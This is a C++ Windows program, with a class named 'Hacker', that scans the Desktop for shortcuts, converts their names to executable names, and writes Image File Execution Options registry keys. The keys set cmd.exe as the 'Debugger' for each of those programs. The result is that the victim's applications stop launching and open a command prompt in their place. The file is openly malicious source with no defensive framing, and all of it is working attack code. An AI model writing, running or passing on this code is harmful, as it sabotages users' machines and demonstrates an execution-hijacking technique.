#include "shlobj.h" 
#include <iostream>
#include <string>
#include <list>
#include <vector>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <io.h>
using namespace std;
class Hacker {
public:
	Hacker()
	{
		Path = this->getDesktopPath();
		GetAllgpxFilepathFromfolder(Path);
	}
private:
	string Path;
public:
	list<string> FileName;
private:
	string  getDesktopPath()		//获取桌面路径
	{
		LPITEMIDLIST pidl;
		LPMALLOC pShellMalloc;
		char szDir[200];
		if (SUCCEEDED(SHGetMalloc(&pShellMalloc)))
		{
			if (SUCCEEDED(SHGetSpecialFolderLocation(NULL, CSIDL_DESKTOP, &pidl))) {
				// 如果成功返回true  
				SHGetPathFromIDListA(pidl, szDir);
				pShellMalloc->Free(pidl);
			}
			pShellMalloc->Release();
		}

		return string(szDir);
	}

private:
	int  GetAllgpxFilepathFromfolder(string Path)
	{
		char szFind[MAX_PATH];
		WIN32_FIND_DATA FindFileData;
		strcpy(szFind, Path.c_str());
		strcat(szFind, "\\*.*");
		HANDLE hFind = FindFirstFile(szFind, &FindFileData);
		if (INVALID_HANDLE_VALUE == hFind)	return -1;
		do
		{
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if (strcmp(FindFileData.cFileName, ".") != 0 && strcmp(FindFileData.cFileName, "..") != 0)
				{
					//发现子目录，递归之
					char szFile[MAX_PATH] = { 0 };
					strcpy(szFile, Path.c_str());
					strcat(szFile, "\\");
					strcat(szFile, FindFileData.cFileName);
					GetAllgpxFilepathFromfolder(szFile);
				}
			}else{
				FileName.push_back(FindFileData.cFileName);
			}
		} while (FindNextFile(hFind, &FindFileData));
		FindClose(hFind);
		return 0;
	}
};

void replaceA_to_B(std::string& S, const std::string A, const std::string B) {
	std::size_t found = S.find(A);
	while (std::string::npos != found) {
		S.replace(found, A.length(), B);
		found = S.find(A, found + 1);
	}
}
int main()
{
	Hacker* one = new Hacker();
	string arr;
	for (list<string>::iterator itor = one->FileName.begin(); itor != one->FileName.end(); itor++)
	{
		replaceA_to_B(*itor, ".lnk", ".exe");
		int pos = 0;
		pos =(*itor).find(".exe");
		if (-1 != pos)
		{
			*itor = (*itor).substr(0, pos+4);
		}
	}
	for (list<string>::iterator itor = one->FileName.begin(); itor != one->FileName.end(); itor++)
	{
		arr = "REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + *itor + "\"" + "  /v Debugger /t REG_SZ /d \"cmd.exe\" /f";
		system(arr.c_str());
	}
	system("pause");
	return 0;
}